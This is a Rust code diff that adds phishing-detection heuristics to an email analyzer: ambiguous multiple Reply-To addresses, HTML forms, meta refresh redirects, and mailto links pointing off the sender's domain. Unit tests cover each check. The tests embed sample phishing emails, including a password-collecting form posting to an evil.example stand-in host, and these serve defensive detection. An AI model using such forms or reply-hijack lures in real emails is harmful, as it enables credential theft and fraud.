@@ -512,6 +512,41 @@ pub async fn analyze_raw_email(bytes: &[u8]) -> Result<ImportedEmail, String> {
             ));
         }
     }
+    // D181: 複数 Reply-To — 返信先の曖昧化 (parser differential)。
+    if env.reply_to.len() > 1 {
+        render_risks.push(
+            "Reply-To に複数のアドレスがあり、返信先が曖昧です — 実装ごとに採用アドレスが異なるなりすましの兆候"
+                .to_string(),
+        );
+    }
+    // D182: HTML 内のフォーム/入力要素 — 資格情報収集形の兆候。
+    if html_extract.as_ref().is_some_and(|e| e.interactive_form) {
+        render_risks
+            .push("HTML 本文にフォーム/入力欄 — 資格情報収集型フィッシングの兆候".to_string());
+    }
+    // D183: meta refresh による自動リダイレクト。
+    if html_extract.as_ref().is_some_and(|e| e.meta_refresh) {
+        render_risks
+            .push("HTML 本文に meta refresh リダイレクト — 自動遷移による誘導の兆候".to_string());
+    }
+    // D184: mailto: リンクが差出人と別ドメインへ返信を誘導 (返信経路ハイジャック)。
+    if let Some(e) = &html_extract {
+        let from_domain = env.from.first().map(|a| a.addr.domain.to_ascii_lowercase());
+        for recipient in &e.mailto_recipients {
+            let recipient_domain = recipient
+                .rsplit('@')
+                .next()
+                .map(|d| d.trim().to_ascii_lowercase());
+            if let (Some(fd), Some(rd)) = (&from_domain, &recipient_domain) {
+                if recipient.contains('@') && rd != fd {
+                    render_risks.push(format!(
+                        "mailto: リンクの返信先 ({rd}) が差出人ドメイン ({fd}) と異なります — 返信経路ハイジャックの兆候"
+                    ));
+                    break;
+                }
+            }
+        }
+    }
     // D164: 複数 From アドレス / Sender ヘッダ不整合の兆候。
     render_risks.extend(from_header_anomalies(&env));
     render_risks.extend(evaluate_link_risks(&urls));
@@ -1621,6 +1656,95 @@ mod tests {
                 .iter()
                 .any(|s| s.contains("複数アドレス")),
             "通常メールで複数アドレス警告は出ないべき: {:?}",
+            r.render_risks
+        );
+        Ok(())
+    }
+
+    /// D181: 複数 Reply-To — 返信先の曖昧化 (parser differential) を報告する。
+    #[tokio::test]
+    async fn analyze_raw_email_は複数reply_toを検出する() -> Result<(), String> {
+        let _serial = test_serial().await;
+        reset_globals().await;
+        let eml = b"From: ceo@corp.example\r\n\
+            Reply-To: ceo@corp.example, attacker@evil.example\r\n\
+            To: you@example.com\r\n\
+            Subject: Hello\r\n\
+            Content-Type: text/plain; charset=utf-8\r\n\
+            \r\n\
+            Hello.\r\n";
+        let r = analyze_raw_email(eml).await?;
+        assert!(
+            r.render_risks.iter().any(|s| s.contains("Reply-To")),
+            "複数 Reply-To は兆候として報告されるべき: {:?}",
+            r.render_risks
+        );
+        Ok(())
+    }
+
+    /// D182: HTML 内フォーム/入力要素 — 資格情報収集形の兆候を報告する。
+    #[tokio::test]
+    async fn analyze_raw_email_はhtml内フォームを検出する() -> Result<(), String> {
+        let _serial = test_serial().await;
+        reset_globals().await;
+        let eml = b"From: it@corp.example\r\n\
+            To: you@example.com\r\n\
+            Subject: Verify your password\r\n\
+            Content-Type: text/html; charset=utf-8\r\n\
+            \r\n\
+            <html><body><p>Confirm your password:</p>\
+            <form action=\"https://evil.example/collect\">\
+            <input type=\"password\" name=\"pw\">\
+            <button>Verify</button></form></body></html>\r\n";
+        let r = analyze_raw_email(eml).await?;
+        assert!(
+            r.render_risks.iter().any(|s| s.contains("フォーム")),
+            "HTML 内フォームは兆候として報告されるべき: {:?}",
+            r.render_risks
+        );
+        Ok(())
+    }
+
+    /// D184: mailto: リンクが差出人と別ドメインへ返信を誘導する
+    /// (返信経路ハイジャック) を報告する。
+    #[tokio::test]
+    async fn analyze_raw_email_はmailto別ドメイン誘導を検出する() -> Result<(), String> {
+        let _serial = test_serial().await;
+        reset_globals().await;
+        let eml = b"From: vendor@corp.example\r\n\
+            To: you@example.com\r\n\
+            Subject: Invoice approval\r\n\
+            Content-Type: text/html; charset=utf-8\r\n\
+            \r\n\
+            <html><body><p>\
+            <a href=\"mailto:attacker@evil.example?subject=Approve\">Reply to approve</a>\
+            </p></body></html>\r\n";
+        let r = analyze_raw_email(eml).await?;
+        assert!(
+            r.render_risks.iter().any(|s| s.contains("mailto")),
+            "別ドメインへの mailto 誘導は兆候として報告されるべき: {:?}",
+            r.render_risks
+        );
+        Ok(())
+    }
+
+    /// D184: mailto: リンクが差出人と同じドメインなら報告しない。
+    #[tokio::test]
+    async fn analyze_raw_email_はmailto同一ドメインで静か() -> Result<(), String> {
+        let _serial = test_serial().await;
+        reset_globals().await;
+        let eml = b"From: vendor@corp.example\r\n\
+            To: you@example.com\r\n\
+            Subject: Invoice approval\r\n\
+            Content-Type: text/html; charset=utf-8\r\n\
+            \r\n\
+            <html><body><p>\
+            <a href=\"mailto:billing@corp.example\">Reply</a>\
+            </p></body></html>\r\n";
+        let r = analyze_raw_email(eml).await?;
+        assert!(
+            !r.render_risks.iter().any(|s| s.contains("mailto")),
+            "同一ドメインの mailto は報告すべきでない: {:?}",
             r.render_risks
         );
         Ok(())
